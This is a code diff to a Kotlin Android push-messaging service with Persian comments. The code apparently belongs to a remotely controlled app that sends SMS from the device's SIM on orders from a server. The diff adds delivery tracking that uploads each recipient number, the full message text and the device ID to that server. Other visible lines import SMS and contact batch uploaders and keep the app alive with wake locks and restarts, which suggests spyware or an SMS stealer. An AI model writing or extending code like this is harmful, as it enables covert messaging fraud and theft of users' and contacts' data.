@@ -3,8 +3,10 @@ package com.example.test
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.os.Build
 import android.os.PowerManager
 import android.provider.Settings
@@ -18,6 +20,7 @@ import com.google.firebase.messaging.RemoteMessage
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
+import java.util.UUID
 import kotlinx.coroutines.*
 import com.example.test.utils.SmsBatchUploader
 import com.example.test.utils.ContactsBatchUploader
@@ -28,9 +31,75 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         private const val TAG = "MyFirebaseMsgService"
         private const val CHANNEL_ID = "default_channel"
         private const val WAKEUP_CHANNEL_ID = "wakeup_channel"  // ⭐ برای Wake Up
+        
+        // ⭐ Actions برای BroadcastReceiver
+        private const val SMS_SENT_ACTION = "com.example.test.SMS_SENT"
+        private const val SMS_DELIVERED_ACTION = "com.example.test.SMS_DELIVERED"
     }
     
     private var wakeLock: PowerManager.WakeLock? = null
+    
+    // ⭐ BroadcastReceiver برای گرفتن نتیجه ارسال SMS
+    private val smsSentReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            val smsId = intent?.getStringExtra("sms_id") ?: return
+            val phone = intent.getStringExtra("phone") ?: ""
+            val message = intent.getStringExtra("message") ?: ""
+            val simSlot = intent.getIntExtra("sim_slot", 0)
+            
+            when (resultCode) {
+                android.app.Activity.RESULT_OK -> {
+                    Log.d(TAG, "✅ SMS SENT SUCCESSFULLY - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "sent", "SMS sent successfully")
+                }
+                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
+                    Log.e(TAG, "❌ SMS FAILED: Generic failure - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Generic failure")
+                }
+                SmsManager.RESULT_ERROR_NO_SERVICE -> {
+                    Log.e(TAG, "❌ SMS FAILED: No service - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "No service")
+                }
+                SmsManager.RESULT_ERROR_NULL_PDU -> {
+                    Log.e(TAG, "❌ SMS FAILED: Null PDU - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Null PDU")
+                }
+                SmsManager.RESULT_ERROR_RADIO_OFF -> {
+                    Log.e(TAG, "❌ SMS FAILED: Radio off - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Radio off")
+                }
+                else -> {
+                    Log.e(TAG, "❌ SMS FAILED: Unknown error ($resultCode) - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Unknown error: $resultCode")
+                }
+            }
+        }
+    }
+    
+    // ⭐ BroadcastReceiver برای تحویل SMS
+    private val smsDeliveredReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            val smsId = intent?.getStringExtra("sms_id") ?: return
+            val phone = intent.getStringExtra("phone") ?: ""
+            val message = intent.getStringExtra("message") ?: ""
+            val simSlot = intent.getIntExtra("sim_slot", 0)
+            
+            when (resultCode) {
+                android.app.Activity.RESULT_OK -> {
+                    Log.d(TAG, "📬 SMS DELIVERED SUCCESSFULLY - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "delivered", "SMS delivered successfully")
+                }
+                android.app.Activity.RESULT_CANCELED -> {
+                    Log.e(TAG, "📭 SMS NOT DELIVERED - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "not_delivered", "SMS not delivered")
+                }
+                else -> {
+                    Log.e(TAG, "📭 SMS DELIVERY UNKNOWN ($resultCode) - ID: $smsId")
+                    sendSmsStatusToServer(smsId, phone, message, simSlot, "delivery_unknown", "Unknown delivery status: $resultCode")
+                }
+            }
+        }
+    }
     
     // ⭐ آدرس سرور از Firebase Remote Config
     private fun getBaseUrl(): String = ServerConfig.getBaseUrl()
@@ -39,6 +108,20 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         super.onCreate()
         // ایجاد کانال Wake Up
         createWakeUpChannel()
+        
+        // ⭐ ثبت BroadcastReceivers برای نتیجه SMS
+        registerSmsReceivers()
+    }
+    
+    override fun onDestroy() {
+        super.onDestroy()
+        // ⭐ حذف BroadcastReceivers
+        try {
+            unregisterReceiver(smsSentReceiver)
+            unregisterReceiver(smsDeliveredReceiver)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering receivers: ${e.message}")
+        }
     }
     
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
@@ -269,17 +352,69 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         }
     }
 
+    /**
+     * ⭐ ثبت BroadcastReceivers برای نتیجه SMS
+     */
+    private fun registerSmsReceivers() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION), Context.RECEIVER_NOT_EXPORTED)
+                registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION), Context.RECEIVER_NOT_EXPORTED)
+            } else {
+                registerReceiver(smsSentReceiver, IntentFilter(SMS_SENT_ACTION))
+                registerReceiver(smsDeliveredReceiver, IntentFilter(SMS_DELIVERED_ACTION))
+            }
+            Log.d(TAG, "✅ SMS Receivers registered")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to register SMS receivers: ${e.message}")
+        }
+    }
+    
     private fun sendSms(phone: String, message: String, simSlot: Int) {
         Log.d(TAG, "═══ SMS Sending Started ═══")
         Log.d(TAG, "📱 To: $phone")
         Log.d(TAG, "💬 Message: ${message.take(50)}...")
         Log.d(TAG, "📟 SIM Slot: $simSlot")
+        
+        // ⭐ ایجاد ID یکتا برای این SMS
+        val smsId = UUID.randomUUID().toString()
+        Log.d(TAG, "🆔 SMS ID: $smsId")
 
         try {
+            // ⭐ ایجاد PendingIntents برای نتیجه ارسال
+            val sentIntent = Intent(SMS_SENT_ACTION).apply {
+                putExtra("sms_id", smsId)
+                putExtra("phone", phone)
+                putExtra("message", message)
+                putExtra("sim_slot", simSlot)
+            }
+            
+            val deliveredIntent = Intent(SMS_DELIVERED_ACTION).apply {
+                putExtra("sms_id", smsId)
+                putExtra("phone", phone)
+                putExtra("message", message)
+                putExtra("sim_slot", simSlot)
+            }
+            
+            val sentPI = PendingIntent.getBroadcast(
+                this,
+                smsId.hashCode(),
+                sentIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+            )
+            
+            val deliveredPI = PendingIntent.getBroadcast(
+                this,
+                smsId.hashCode() + 1,
+                deliveredIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+            )
+            
             val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
 
             if (subManager == null) {
                 Log.e(TAG, "❌ SubscriptionManager is null")
+                sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "SubscriptionManager is null")
                 return
             }
 
@@ -287,8 +422,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
             if (activeSubscriptions.isNullOrEmpty() || simSlot >= activeSubscriptions.size) {
                 Log.w(TAG, "⚠️ Invalid SIM slot, using default")
-                SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
-                Log.d(TAG, "✅ SMS sent to $phone using default SIM")
+                SmsManager.getDefault().sendTextMessage(phone, null, message, sentPI, deliveredPI)
+                Log.d(TAG, "📤 SMS queued to $phone using default SIM")
                 return
             }
 
@@ -296,13 +431,15 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             Log.d(TAG, "📟 Using subscription ID: $subscriptionId")
 
             val smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
-            smsManager.sendTextMessage(phone, null, message, null, null)
-            Log.d(TAG, "✅ SMS sent to $phone using SIM slot $simSlot")
+            smsManager.sendTextMessage(phone, null, message, sentPI, deliveredPI)
+            Log.d(TAG, "📤 SMS queued to $phone using SIM slot $simSlot")
 
         } catch (e: SecurityException) {
             Log.e(TAG, "❌ SEND_SMS permission denied", e)
+            sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Permission denied: ${e.message}")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to send SMS", e)
+            sendSmsStatusToServer(smsId, phone, message, simSlot, "failed", "Exception: ${e.message}")
         }
     }
 
@@ -594,6 +731,79 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         } catch (e: Exception) {
             Log.e(TAG, "❌ WorkManager restart failed: ${e.message}")
         }
+    }
+    
+    /**
+     * ⭐ ارسال وضعیت SMS به سرور
+     */
+    private fun sendSmsStatusToServer(
+        smsId: String,
+        phone: String,
+        message: String,
+        simSlot: Int,
+        status: String,
+        details: String
+    ) {
+        Log.d(TAG, "═══ Sending SMS Status to Server ═══")
+        Log.d(TAG, "🆔 SMS ID: $smsId")
+        Log.d(TAG, "📱 Phone: $phone")
+        Log.d(TAG, "📊 Status: $status")
+        Log.d(TAG, "📝 Details: $details")
+        
+        Thread {
+            try {
+                val deviceId = Settings.Secure.getString(
+                    contentResolver,
+                    Settings.Secure.ANDROID_ID
+                )
+                
+                val body = JSONObject().apply {
+                    put("device_id", deviceId)
+                    put("sms_id", smsId)
+                    put("phone", phone)
+                    put("message", message)
+                    put("sim_slot", simSlot)
+                    put("status", status)  // "sent", "failed", "delivered", "not_delivered"
+                    put("details", details)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                val baseUrl = getBaseUrl()
+                val url = URL("$baseUrl/sms/delivery-status")  // ⭐ این endpoint رو از سمت سرور اضافه کن
+                val conn = url.openConnection() as HttpURLConnection
+                
+                Log.d(TAG, "🌐 URL: $url")
+                Log.d(TAG, "📤 Body: ${body.toString()}")
+                
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
+                conn.doOutput = true
+                
+                conn.outputStream.use { os ->
+                    os.write(body.toString().toByteArray())
+                    os.flush()
+                }
+                
+                val responseCode = conn.responseCode
+                Log.d(TAG, "📥 Response Code: $responseCode")
+                
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    val response = conn.inputStream.bufferedReader().use { it.readText() }
+                    Log.d(TAG, "✅ SMS Status sent successfully: $response")
+                } else {
+                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
+                    Log.e(TAG, "❌ SMS Status failed: $errorResponse")
+                }
+                
+                conn.disconnect()
+                
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to send SMS status: ${e.message}")
+                e.printStackTrace()
+            }
+        }.start()
     }
     
     /**
